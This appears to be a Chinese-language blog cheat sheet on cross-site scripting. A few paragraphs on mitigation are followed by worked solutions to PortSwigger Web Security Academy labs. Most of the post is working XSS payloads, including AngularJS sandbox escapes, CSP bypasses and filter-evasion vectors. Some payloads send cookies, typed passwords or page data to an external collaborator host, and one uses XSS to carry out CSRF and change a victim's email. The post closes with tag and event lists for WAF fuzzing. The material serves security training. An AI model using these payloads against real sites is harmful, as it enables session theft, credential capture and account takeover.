---
title: payload备忘单
categories: front-end
img: /images/js前端.jpg
tags:
  - html
  - csrf
  - js
  - csp
abbrlink: 19154
date: 2024-09-21 11:29:53
---

## payload备忘单

### 将输出数据编码处理

在用户输入写入页面之前就应该执行编码操作，而且不同的上下文，编码方式不同，比如上下文为HTML时

```xml
< 编码成 &lt;
> 编码成 &gt;
```

上下文为JS时

```markdown
< 编码成 \u003c
> 编码成 \u003e
```

有的时候还需要按顺序进行多层编码处理以防止出现像onclick事件的情况。

### 验证输入

需要尽量严格地验证输入，比如采取这样的措施

- 如果响应会返回提交的URL，则验证是不是HTTP或HTTPS开头的
- 如果预期输入是数字，则验证输入是否为整数
- 验证输入中包含的字符是否均为允许的字符

### 白名单还是黑名单

一般情况下都会选择白名单，因为如果使用黑名单的话，永远不知道有没有遗漏，俗话说，宁可错杀一千不放过一个嘛。

### 允许安全的HTML

应尽可能地限制使用HTML标记，应该过滤到有害的标签和JS，也可以引入一些执行过滤和编码的JS库，如DOMPurify。有些库还允许用户使用markdown来编写内容再渲染成HTML，但是这些库都不是绝对的安全，所以要及时更新。

### 如何使用模板引擎缓解

有些网站使用Twig和Freemarker等服务器端模板引擎在HTML中嵌入动态内容，他们都有自己的过滤器，还有一些引擎，比如Jinja和React，它们默认情况下就会转义动态内容，一定程度上也会缓解XSS攻击。

### 如何在PHP中缓解XSS

可以利用内置的HTML编码函数htmlentities，它有三个参数分别为

- 输入字符串
- ENT_QUOTES，编码所有引号标志
- 字符集，一般为UTF-8



### 实践

**BurpSuite-Lab**
1:将 存储XSS 到 HTML 上下文中，不编码任何内容

```js
<script>alert(123)</script>
```

2: DOM XSS使用 source 的 sink 中的中的 document.location.search
f12查看sources中对应的内容
备注：由于在hexo中，会索引到img src="图片路径"，则都需要用`到代替"
```js
 function trackSearch(query) {
                            document.write('<img src=`/resources/images/tracker.gif?searchTerms='+query+'`>');
                        }

<img src=`/resources/images/tracker.gif`?searchTerms='+`><svg onload=alert(1)>+'">
```

输入query为：
```js
"><svg onload=alert(1)>
```
3: DOM XSS使用源的 jQuery 锚点属性接收器中的 href属性location.search
将url的/改为javascript:alert(document.cookie)
https://0ad9001d035f473b80f13a8200ab00af.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
4：DOM XSS使用 hashchange 事件的 jQuery 选择器接收器
在exploit server上，body中输入

```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

并推送到服务器，会出现打印弹窗
5：将反射XSS 到带有尖括号 HTML 编码的属性中

搜索框输入
```js
"onmouseover="alert(1)
```
当鼠标移动到上面会打印1
6：将存储XSS 到带有双引号 HTML 编码的锚点属性中href

添加评论信息，post请求体如下：
```js
csrf=j0OvPoGjDV3Hdu6pubtZJhSHiI2Kyf3U&postId=8&comment=a&name=a&email=a%40qq.com&website=javascript:alert(1)
```
点击name为a的会弹出弹窗打印1
7：将反射XSS 为带有尖括号 HTML 编码的 JavaScript 字符串
f12查看sources中对应的内容

```js
<script>
 var searchTerms = 'sss';
 document.write('<img src=`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`>');
</script>
<img src=`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`>
```
```js
GET /?search='-alert(123)-'
```
8：DOM XSS在document.write sink，使用源代码位置在select元素内搜索

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
                                if(store) {
                                    document.write('<option selected>'+store+'</option>');
                                }
```

在url中添加
```js
https://0a810071039aa59780d24e4b002300ec.web-security-academy.net/product?product?productId=1&storeId=London</select><img%20src=1%20onerror=alert(1)>
```

9：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码
搜索框输入：
```js
{{$on.constructor('alert(1)')()}}
```
10：反射型 DOM XSS
搜索框输入：
```js
\"-alert(1)}//
```
分析：
搜索框输入：
11111
f12在xhr中，获取搜索接口，响应返回的json数据
```js
{"results":[],"searchTerm":"11111"}
```
由于您已注入反斜杠并且站点未转义它们，因此当 JSON 响应尝试转义左双引号字符时，它会添加第二个反斜杠。生成的双反斜杠会导致转义被有效地抵消。这意味着双引号以未转义的方式处理，这将关闭应包含搜索词的字符串。

然后，在调用函数之前，使用算术运算符（在本例中为减法运算符）分隔表达式。最后，一个右大括号和两个正斜杠提前结束 JSON 对象，并注释掉对象的其余部分。因此，将生成如下响应：alert()
```json
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```
10：存储的 DOM XSS
为了防止 XSS，该网站使用 JavaScript replace()函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个出现的参数。我们通过在评论的开头添加一组额外的尖括号来利用此漏洞。这些尖括号将被编码，但任何后续尖括号都不会受到影响，这使我们能够有效地绕过过滤器并注入 HTML。
博客评论区输入：

```js
<><img src=1 onerror=alert(1)>
```

11：将反射XSS到 HTML 上下文中，但大多数标记和属性被阻止

```js
<body onresize=print()>
```

由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2
以下body的payload字符串经过Unicode

```js
<iframe src="https://0a50008303e28dba83b1e64700f6000b.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

12:将反射XSS 到 HTML 上下文中，并阻止除自定义标记之外的所有标记
<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'
由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2
以下body的payload字符串经过encodeURI

```js
<script>
location = 'https://0a9a00b903f99be184fc8113004b0072.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```



13：允许使用一些 SVG 标记的反射型 XSS
(1)注入标准 XSS 有效负载，例如：

```js
<img src=1 onerror=alert(1)>
```

(2)请注意，此有效负载是否被阻止。在接下来的几个步骤中，我们将使用 Burp Intruder 来测试哪些标签和属性被阻止。
(3)打开 Burp 的浏览器并使用实验室中的搜索功能。将结果请求发送到 Burp Intruder。在 Burp Intruder 的 Positions 选项卡中，单击 “Clear §”。在请求模板中，将搜索词的值替换为：<>,将光标放在尖括号之间，然后单击“添加 §”两次以创建有效载荷位置。搜索词的值现在应为：<§§>
(4)访问 XSS 备忘单，然后单击“将标签复制到剪贴板”。在 Burp Intruder 的 Payloads 选项卡中，单击 “Paste” 将标签列表粘贴到有效负载列表中。点击 “Start attack”（开始攻击）。
(5)攻击完成后，查看结果。请注意，所有有效负载都导致了 HTTP 400 响应，但使用 、、 和 标签的有效负载除外，它们收到了 200 响应。

```js
<svg><animatetransform><title><image>
```

返回 Burp Intruder 中的 Positions 选项卡，并将您的搜索词替换为：

```js
<svg><animatetransform%20=1>
```

(6)将光标放在字符前面，然后单击“Add §”两次以创建有效负载位置。搜索词的值现在应为：

```js
<svg><animatetransform%20§§=1>
```

(7)访问 XSS 备忘单，然后单击“将事件复制到剪贴板”。在 Burp Intruder 的 Payloads 选项卡中，单击 “Clear” 以删除之前的有效负载。然后单击 “Paste” 将属性列表粘贴到有效负载列表中。点击 “Start attack”（开始攻击）。
(8)攻击完成后，查看结果。请注意，所有负载都会导致 HTTP 400 响应，但负载除外，它会导致 200 响应。onbegin
(9)在浏览器中访问以下 URL，确认已调用 alert（） 函数并解决实验室问题：
```js
https://0aa100bd047ee12881854ebc00e20027.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>
encodeURI编码下
https://0aa100bd047ee12881854ebc00e20027.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```
注意：需要放在js代码块中才能xss不生效,在txt中会被解析
14:规范链接标签中的反射型 XSS
在url后面添加'accesskey='x'onclick='alert(1)
在进行encodeURI编码
```js
https://0a8900cc04dcf2c180d5948f00730041.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
要触发对自己的漏洞利用，请按以下组合键之一：
在 Windows 上：ALT+SHIFT+X
在 MacOS 上：CTRL+ALT+X
在 Linux 上：Alt+X

15:将反射XSS为JavaScript 字符串，并转义单引号和反斜杠
搜索框输入：

```js
</script><script>alert(1)</script>
  或者：  
</script><img src=1 onerror=alert(/xss/)>
```

source中

```js
<script>
var searchTerms = '</script><script>alert(1)</script>';
                    document.write('<img src=`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`>');
                </script>
```

16：将反射 XSS 为带有尖括号和双引号的 JavaScript 字符串，HTML 编码和单引号转义
payload：\'-alert(1)//

先将\转义为\\然后'将前面内容进行闭合,再用-间隔内容，最后//注释后面内容

```js
 <script>
                        var searchTerms = '\\'-alert(1)//';
                        document.write('<img src=`/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'`>');
                    </script>
```

17：存储型XSS 到onclick带有尖括号和双引号的事件中，HTML 编码和单引号和反斜杠转义
评论处：http://foo?&apos;-alert(1)-&apos;
由于&apos;不受encodeURI编码和html十进制和十六进制实体编码控制，
浏览器解析为：http://test/?%27-alert(1)-%27
控制台解析为：http://foo?'-alert(1)-'

```js
<p>
       <img src=`/resources/images/avatarDefault.svg` class="avatar">                            
      <a id="author" href="http://foo?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">a</a> | 15 September 2024
</p>
```

18：反射XSS 为带有尖括号、单引号、双引号、反斜杠和反引号Unicode 转义的模板文字
https://0aa900a50400294980761c6e00c50009.web-security-academy.net/?search=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E
测试:
搜索框输入：
```js
<script>alert(123)</script>
```
sources中获取到的信息

```js
 <script>
                            var message = `0 search results for '\u003cscript\u003ealert(123)\u003c/script\u003e'`;
                            document.getElementById('searchMessage').innerText = message;
                        </script>
```

使用HTML在线编码
\u003c进行html实体解码，获得<，其他同理
解决：
输入内容：
```js
${alert(1)}或${alert(document.domain)}
```
19：利用跨站脚本窃取 Cookie
collabarator临时子域名：
r80ec4rdwac7pt2czguxh540frlj9a2yr.oastify.com

```js
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
url:'/my-account',
mode: 'no-cors',
body:document.cookie
});
</script>
```

发送评论后，刷新页面，在collaborator中找到type为http,且请求体中包含secret和session字段

20:利用跨站点脚本捕获密码
collabarator临时子域名：
e7m1brq0vxbuog1zy3tkgs3neek68x3ls.oastify.com

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

在collabarator的type为http中查看request to callabarator
administrator:hfzcg67v8of35vja210d

21:利用 XSS 执行 CSRF

登录wiener:peter账号

```js
<input required="" type="hidden" name="csrf" value="E7tYLI9q0fpKyvHfk9B43Q7uKohOuYn2">
```

这将使查看评论的任何人发出 POST 请求，以将其电子邮件地址更改为 。test@test.com


```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

22：使用 AngularJS 沙盒转义的反射型 XSS（无字符串）
搜索框输入：
```js
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
返回提示："Search term cannot exceed 120 characters"

直接在浏览器输入访问：
```js
https://0aa9001f034675508038ee620064001f.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
该漏洞利用toString（）在不使用引号的情况下创建字符串。然后，它获取String原型，并覆盖每个字符串的charAt函数。这有效地破坏了AngularJS沙盒。接下来，一个数组被传递给orderBy过滤器。然后，我们再次使用toString（）创建字符串和string构造函数属性来设置过滤器的参数。最后，我们使用fromCharCode方法通过将字符代码转换为字符串x=alert（1）来生成有效载荷。由于charAt函数已被覆盖，AngularJS将允许执行通常不允许的代码。

23：使用 AngularJS 沙盒转义和 CSP 的反射型 XSS
需要对https://0a200081030bf9f9855f69ce00700051.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
进行encodeURI编码,不会对特殊符号编码

```js
<script>
location='https://0a200081030bf9f9855f69ce00700051.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```


该漏洞利用AngularJS中的ng-focus事件创建绕过CSP的焦点事件。它还使用$event，这是一个引用事件对象的AngularJS变量。path属性特定于Chrome，包含触发事件的元素数组。数组中的最后一个元素包含窗口对象。

通常，在JavaScript中，|是位或操作，但在AngularJS中，它表示一个过滤操作，在本例中为orderBy过滤器。冒号表示正在发送到筛选器的参数。在参数中，我们没有直接调用alert函数，而是将其赋值给变量z。只有当orderBy操作到达$event.path数组中的窗口对象时，才会调用该函数。这意味着可以在窗口范围内调用它，而无需显式引用窗口对象，从而有效地绕过AngularJS的窗口检查。

24：反射型 XSS事件处理程序和href属性被阻止
```js
https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
```
25：在 JavaScript URL 中反射 XSS，但某些字符被阻止
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
分析：
评论页面url为：
https://0afd00b80465483a8194a891005800d5.web-security-academy.net/post?postId=5
查看source的源码：

```html
<div class="is-linkback">
                    <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5'}).finally(_ => window.location = '/')">Back to Blog</a>
                </div>
```

url解码后：
```js
<div class="is-linkback">
                    <a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5'}).finally(_ => window.location = '/')">Back to Blog</a>
                </div>
```

添加参数：&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
闭合前面内容
并整体url编码

```js
<div class="is-linkback">
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d5%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

26：反射型 XSS 受非常严格的 CSP 保护，具有悬空标记攻击
查看响应头中的内容：
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';

```js
<script>
if(window.name) {
		new Image().src='//929w6mlvqs6pjbwutyofbnyi99f13s1gq.oastify.com?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://0ab700c7035e5c1580b84ebe00a800fb.web-security-academy.net/my-account?email="><a href="https://exploit-0ab2006303505c2080ac4d03017500d5.exploit-server.net/exploit">Click me</a><base target='';
}
</script>
```

27:反射型 XSS受 CSP 保护，具有 CSP 旁路功能
分析：
搜索框输入：a
查看响应头：
Content-Security-Policy:
default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=

使用payload:
```js
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```
进行encodeURI编码：
https://0a40001403b383c084c536da005200cb.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

弹窗后，查看响应头：
Content-Security-Policy:
default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'

### payload

备忘单包含许多可以帮助您绕过 WAF 和过滤器的矢量。您可以按事件、标签或浏览器选择向量，并且每个向量都包含概念验证。

**Event handlers**

标签payload

```txt
a
a2
abbr
acronym
address
applet
area
article
aside
audio
audio2
b
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
img
input
input2
input3
input4
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
```

事件payload

```txt
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforetoggle
onbeforeunload
onbegin
onblur
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfocus
onfocus(autofocus)
onfocusin
onfocusout
onformdata
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointercancel
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onscrollend
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onsubmit
onsuspend
ontimeupdate
ontoggle
ontoggle(popover)
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkitmouseforcechanged
onwebkitmouseforcedown
onwebkitmouseforceup
onwebkitmouseforcewillbegin
onwebkitplaybacktargetavailabilitychanged
onwebkittransitionend
onwebkitwillrevealbottom
onwheel
```

浏览器payload

```txt
All browsers
Chrome
Firefox
Safari
```

参考:

[跨站点脚本（XSS）备忘单](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncanplay)

[burpsuite靶场系列之客户端漏洞篇)](https://www.anquanke.com/post/id/245953#h3-74)